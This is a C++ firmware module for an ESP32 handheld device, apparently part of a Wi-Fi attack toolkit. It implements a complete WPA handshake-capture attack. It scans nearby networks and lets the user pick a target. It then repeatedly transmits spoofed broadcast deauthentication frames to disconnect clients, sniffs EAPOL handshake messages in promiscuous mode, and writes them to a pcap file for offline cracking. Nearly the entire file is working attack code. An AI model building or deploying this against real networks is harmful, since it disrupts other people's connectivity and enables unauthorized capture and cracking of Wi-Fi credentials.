#include "attack_handshake.h"
#include "wifi_attacks_common.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <FFat.h>
#include <SD.h>
#include <vector>

namespace attack_handshake {

using namespace wifi_attacks_common;

enum HsState : uint8_t {
  STATE_SCANNING = 0,
  STATE_SELECT_NET,
  STATE_RUNNING,
  STATE_DONE
};

static HsState s_state = STATE_SCANNING;

#pragma pack(push, 1)
struct PcapGlobalHdr {
  uint32_t magic        = 0xa1b2c3d4;
  uint16_t ver_major    = 2;
  uint16_t ver_minor    = 4;
  int32_t  thiszone     = 0;
  uint32_t sigfigs      = 0;
  uint32_t snaplen      = 65535;
  uint32_t network      = 105;
};

struct PcapPktHdr {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

struct DeauthFrame {
  uint8_t  frame_ctrl[2]       = { 0xC0, 0x00 };
  uint8_t  duration[2]         = { 0x00, 0x00 };
  uint8_t  station[6];
  uint8_t  sender[6];
  uint8_t  access_point[6];
  uint8_t  frag_seq[2]         = { 0xF0, 0xFF };
  uint16_t reason              = 7;
};
#pragma pack(pop)

struct HsScannedAp {
  char    ssid[33];
  char    bssid[18];
  uint8_t channel;
  int32_t rssi;
};

static std::vector<HsScannedAp> s_hsNets;
static int   s_hsNetSel    = 0;
static float s_hsNetBarY   = (float)kStartY;
static float s_hsNetScroll = 0.0f;
static float s_hsNetTargetScroll = 0.0f;

static char    s_hsSsid[33]  = "";
static char    s_hsBssid[18] = "";
static uint8_t s_hsBssidBytes[6] = {};
static uint8_t s_hsChan = 1;

static volatile uint8_t s_hsMsgMask = 0;
static volatile uint32_t s_hsPktCount = 0;
static bool s_hsRunning = false;
static char s_hsSavePath[64] = "";
static bool s_hsSaved = false;

#define HS_MAX_PKTS 8
#define HS_PKT_MAXLEN 512
struct HsPacket {
  uint8_t  data[HS_PKT_MAXLEN];
  uint16_t len;
  uint32_t ts_sec;
  uint32_t ts_usec;
  bool     used;
};
static HsPacket s_hsBuf[HS_MAX_PKTS];
static volatile int s_hsBufIdx = 0;

static const uint8_t kEapolLlc[8] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};
static DeauthFrame s_deauthFrame;

static bool parseBssidStr(const char* str, uint8_t out[6]) {
  return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
}

static uint8_t eapolMsgNum(const uint8_t* eapol, int len) {
  if (len < 9) return 0;
  if (eapol[1] != 3) return 0;
  if (len < 8) return 0;
  uint16_t ki = ((uint16_t)eapol[5] << 8) | eapol[6];
  bool ack    = (ki >> 7) & 1;
  bool mic    = (ki >> 8) & 1;
  bool secure = (ki >> 9) & 1;
  bool install= (ki >> 6) & 1;
  if ( ack && !mic && !secure) return 1;
  if (!ack &&  mic && !secure) return 2;
  if ( ack &&  mic &&  secure && install) return 3;
  if (!ack &&  mic &&  secure && !install) return 4;
  return 0;
}

static IRAM_ATTR void hsSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!s_hsRunning) return;
  const wifi_promiscuous_pkt_t* raw = (wifi_promiscuous_pkt_t*)buf;
  int pktLen = raw->rx_ctrl.sig_len;
  if (pktLen < 34 || pktLen > HS_PKT_MAXLEN) return;

  const uint8_t* p = raw->payload;

  uint8_t fc0 = p[0];
  if ((fc0 & 0x0C) != 0x08) return;

  uint8_t fc1 = p[1];
  bool toDS   = (fc1 & 0x01) != 0;
  bool fromDS = (fc1 & 0x02) != 0;

  const uint8_t* bssid = nullptr;
  if (!toDS && !fromDS) bssid = p + 16;
  else if (toDS && !fromDS) bssid = p + 4;
  else if (!toDS && fromDS) bssid = p + 10;
  else bssid = p + 16;

  if (memcmp(bssid, s_hsBssidBytes, 6) != 0) return;

  int macHdrLen = 24;
  uint8_t subtype = (fc0 >> 4) & 0x0F;
  if (subtype == 8 || subtype == 9 || subtype == 10 || subtype == 11) {
    macHdrLen = 26;
  }

  if (pktLen < macHdrLen + 8) return;

  const uint8_t* llc = p + macHdrLen;
  if (memcmp(llc, kEapolLlc, 8) != 0) return;

  const uint8_t* eapol = llc + 8;
  int eapolLen = pktLen - macHdrLen - 8;
  if (eapolLen < 4) return;

  uint8_t msgNum = eapolMsgNum(eapol, eapolLen);
  if (msgNum == 0) return;

  s_hsMsgMask |= (1 << (msgNum - 1));
  s_hsPktCount++;

  int idx = s_hsBufIdx;
  if (idx < HS_MAX_PKTS) {
    uint16_t copyLen = (pktLen > HS_PKT_MAXLEN) ? HS_PKT_MAXLEN : (uint16_t)pktLen;
    memcpy(s_hsBuf[idx].data, p, copyLen);
    s_hsBuf[idx].len     = copyLen;
    s_hsBuf[idx].ts_sec  = (uint32_t)(millis() / 1000);
    s_hsBuf[idx].ts_usec = (millis() % 1000) * 1000;
    s_hsBuf[idx].used    = true;
    s_hsBufIdx = idx + 1;
  }
}

static void hsSavePcap() {
  char safeSsid[17] = {};
  for (int i = 0; i < 16 && s_hsSsid[i]; i++) {
    char c = s_hsSsid[i];
    safeSsid[i] = (c >= 32 && c < 127 && c != '/' && c != '\\' && c != ':' && c != ' ') ? c : '_';
  }
  if (safeSsid[0] == '\0') strcpy(safeSsid, "target");

  snprintf(s_hsSavePath, sizeof(s_hsSavePath), "/pcaps/hs_%s.pcap", safeSsid);

  File f;
  if (SD.exists("/")) {
    if (!SD.exists("/pcaps")) SD.mkdir("/pcaps");
    f = SD.open(s_hsSavePath, FILE_WRITE);
  }

  if (!f) {
    if (!FFat.exists("/pcaps")) {
      FFat.mkdir("/pcaps");
    }
    f = FFat.open(s_hsSavePath, FILE_WRITE);
  }

  if (!f) {
    Serial.printf("[Handshake] Failed to open %s for write\n", s_hsSavePath);
    return;
  }

  PcapGlobalHdr gh;
  f.write((const uint8_t*)&gh, sizeof(gh));

  int count = s_hsBufIdx;
  for (int i = 0; i < count; i++) {
    if (!s_hsBuf[i].used) continue;
    PcapPktHdr ph;
    ph.ts_sec  = s_hsBuf[i].ts_sec;
    ph.ts_usec = s_hsBuf[i].ts_usec;
    ph.incl_len = s_hsBuf[i].len;
    ph.orig_len = s_hsBuf[i].len;
    f.write((const uint8_t*)&ph, sizeof(ph));
    f.write(s_hsBuf[i].data, s_hsBuf[i].len);
  }
  f.close();
  s_hsSaved = true;
  Serial.printf("[Handshake] Successfully saved %d packets to %s\n", count, s_hsSavePath);
}

static void hsStart() {
  s_hsMsgMask  = 0;
  s_hsPktCount = 0;
  s_hsBufIdx   = 0;
  s_hsSaved    = false;
  memset(s_hsBuf, 0, sizeof(s_hsBuf));

  parseBssidStr(s_hsBssid, s_hsBssidBytes);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  esp_wifi_set_channel(s_hsChan, WIFI_SECOND_CHAN_NONE);

  static const wifi_promiscuous_filter_t filt = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA
  };
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&hsSniffer);

  memcpy(s_deauthFrame.sender,       s_hsBssidBytes, 6);
  memcpy(s_deauthFrame.access_point, s_hsBssidBytes, 6);
  static const uint8_t kBcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  memcpy(s_deauthFrame.station, kBcast, 6);
  s_hsRunning = true;
  for (int i = 0; i < 5; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, &s_deauthFrame, sizeof(s_deauthFrame), false);
    delay(10);
  }
}

static void hsStop() {
  s_hsRunning = false;
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
}

static void hsStartScan() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  s_hsNets.clear();
  s_hsNetSel = 0;
  s_hsNetBarY = (float)kStartY;
  s_hsNetScroll = 0.0f;
  s_hsNetTargetScroll = 0.0f;
  WiFi.scanNetworks(true, false, false, 250);
  s_state = STATE_SCANNING;
}

static void hsCheckScanComplete() {
  int16_t n = WiFi.scanComplete();
  if (n == WIFI_SCAN_RUNNING) return;
  if (n < 0) {
    s_state = STATE_SCANNING;
    return;
  }
  s_hsNets.clear();
  for (int i = 0; i < n; i++) {
    HsScannedAp ap;
    strncpy(ap.ssid,  WiFi.SSID(i).c_str(), 32); ap.ssid[32] = '\0';
    strncpy(ap.bssid, WiFi.BSSIDstr(i).c_str(), 17); ap.bssid[17] = '\0';
    ap.channel = WiFi.channel(i);
    ap.rssi    = WiFi.RSSI(i);
    s_hsNets.push_back(ap);
  }
  WiFi.scanDelete();
  s_state = STATE_SELECT_NET;
}

void open() {
  hsStartScan();
}

void close() {
  if (s_hsRunning) {
    hsStop();
  }
  WiFi.scanDelete();
  WiFi.mode(WIFI_OFF);
}

void tick(uint32_t now) {
  if (s_state == STATE_SCANNING) {
    hsCheckScanComplete();
  } else if (s_state == STATE_SELECT_NET) {
    int total = (int)s_hsNets.size();
    if (total > 0) {
      if (s_hsNetSel >= total) s_hsNetSel = total - 1;
      updateScroll(s_hsNetSel, total, s_hsNetScroll, s_hsNetTargetScroll, s_hsNetBarY);
    }
  } else if (s_state == STATE_RUNNING) {
    static uint32_t s_lastHsDeauth = 0;
    if (now - s_lastHsDeauth >= 2500) {
      s_lastHsDeauth = now;
      for (int i = 0; i < 4; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, &s_deauthFrame, sizeof(s_deauthFrame), false);
      }
    }

    if (!s_hsSaved && (s_hsMsgMask & 0x03) == 0x03) {
      hsStop();
      hsSavePcap();
      s_state = STATE_DONE;
    }
  }
}

void onKey(const KeyEvent& ev) {
  if (ev.repeat) return;

  if (s_state == STATE_SELECT_NET) {
    int total = (int)s_hsNets.size();
    if (total > 0) {
      if (ev.key == BTN_UP) {
        s_hsNetSel = (s_hsNetSel - 1 + total) % total;
      } else if (ev.key == BTN_DOWN) {
        s_hsNetSel = (s_hsNetSel + 1) % total;
      } else if (ev.key == BTN_OK) {
        const auto& ap = s_hsNets[s_hsNetSel];
        strncpy(s_hsSsid,  ap.ssid,  32); s_hsSsid[32]  = '\0';
        strncpy(s_hsBssid, ap.bssid, 17); s_hsBssid[17] = '\0';
        s_hsChan = ap.channel;
        hsStart();
        s_state = STATE_RUNNING;
      }
    }
  } else if (s_state == STATE_DONE) {
    if (ev.key == BTN_OK) {
      open();
    }
  }
}

bool onBack() {
  if (s_state == STATE_SCANNING || s_state == STATE_SELECT_NET) {
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);
    return false;
  } else if (s_state == STATE_RUNNING) {
    hsStop();
    return false;
  } else if (s_state == STATE_DONE) {
    return false;
  }
  return false;
}

void draw(U8G2& u8g2, uint32_t now) {
  if (s_state == STATE_SCANNING) {
    drawHeader(u8g2, "WIFI SCAN");
    u8g2.setFont(u8g2_font_6x12_tr);
    int dots = (now / 350) % 4;
    char waitBuf[20];
    snprintf(waitBuf, sizeof(waitBuf), "Scanning%.*s", dots, "...");
    int tw = u8g2.getStrWidth(waitBuf);
    u8g2.drawStr((128 - tw) / 2, 40, waitBuf);
    return;
  }

  if (s_state == STATE_SELECT_NET) {
    drawHeader(u8g2, "SELECT TARGET");
    u8g2.setClipWindow(0, 14, 128, 64);
    int total = (int)s_hsNets.size();
    if (total == 0) {
      u8g2.setFont(u8g2_font_6x12_tr);
      u8g2.drawStr(16, 36, "No networks found");
    } else {
      u8g2.setFont(u8g2_font_6x12_tr);
      for (int i = 0; i < total; i++) {
        int y = kStartY + (int)(i * kRowH - s_hsNetScroll + 0.5f);
        if (y < kStartY - kRowH || y > 64) continue;
        char lineBuf[32];
        snprintf(lineBuf, sizeof(lineBuf), "%s", s_hsNets[i].ssid[0] ? s_hsNets[i].ssid : "<Hidden>");
        while (strlen(lineBuf) > 0 && u8g2.getStrWidth(lineBuf) > 95) {
          lineBuf[strlen(lineBuf) - 1] = '\0';
        }
        u8g2.drawStr(6, y + 10, lineBuf);

        char chBuf[8];
        snprintf(chBuf, sizeof(chBuf), "c%d", s_hsNets[i].channel);
        u8g2.drawStr(106, y + 10, chBuf);
      }
      u8g2.setDrawColor(2);
      int curY = (int)(s_hsNetBarY + 0.5f);
      if (curY < kStartY) curY = kStartY;
      if (curY > 64 - kRowH) curY = 64 - kRowH;
      u8g2.drawBox(2, curY, 124, kRowH);
      u8g2.setDrawColor(1);
    }
    u8g2.setMaxClipWindow();
    return;
  }

  if (s_state == STATE_RUNNING) {
    drawHeader(u8g2, "CAPTURING HS");
    u8g2.setFont(u8g2_font_6x12_tr);

    char buf[40];
    snprintf(buf, sizeof(buf), "AP: %s", s_hsSsid);
    while (strlen(buf) > 0 && u8g2.getStrWidth(buf) > 120) {
      buf[strlen(buf) - 1] = '\0';
    }
    u8g2.drawStr(4, 25, buf);

    snprintf(buf, sizeof(buf), "CH: %d  PKTS: %lu", s_hsChan, (unsigned long)s_hsPktCount);
    u8g2.drawStr(4, 37, buf);

    for (int i = 0; i < 4; i++) {
      int x = 4 + i * 31;
      bool captured = (s_hsMsgMask & (1 << i)) != 0;
      if (captured) {
        u8g2.drawBox(x, 42, 28, 10);
        u8g2.setDrawColor(0);
        char mBuf[6];
        snprintf(mBuf, sizeof(mBuf), "M%d", i + 1);
        u8g2.drawStr(x + 6, 50, mBuf);
        u8g2.setDrawColor(1);
      } else {
        u8g2.drawFrame(x, 42, 28, 10);
        char mBuf[6];
        snprintf(mBuf, sizeof(mBuf), "m%d", i + 1);
        u8g2.drawStr(x + 6, 50, mBuf);
      }
    }

    u8g2.drawBox(2, 54, 124, 9);
    u8g2.setDrawColor(0);
    int dots = (now / 250) % 4;
    snprintf(buf, sizeof(buf), "SNIFFING/DEAUTH%.*s", dots, "...");
    u8g2.drawStr(6, 62, buf);
    u8g2.setDrawColor(1);
    return;
  }

  if (s_state == STATE_DONE) {
    drawHeader(u8g2, "HS CAPTURED!");
    u8g2.setFont(u8g2_font_6x12_tr);
    u8g2.drawStr(4, 25, "Saved Handshake:");

    u8g2.setFont(u8g2_font_5x8_tr);
    char buf[40];
    snprintf(buf, sizeof(buf), "%s", s_hsSavePath);
    while (strlen(buf) > 0 && u8g2.getStrWidth(buf) > 120) {
      buf[strlen(buf) - 1] = '\0';
    }
    u8g2.drawStr(4, 38, buf);

    u8g2.setFont(u8g2_font_6x12_tr);
    u8g2.drawStr(4, 50, "M1+M2 captured OK!");

    u8g2.drawBox(2, 54, 124, 9);
    u8g2.setDrawColor(0);
    u8g2.drawStr(16, 62, "[OK / BACK] EXIT");
    u8g2.setDrawColor(1);
    return;
  }
}

}
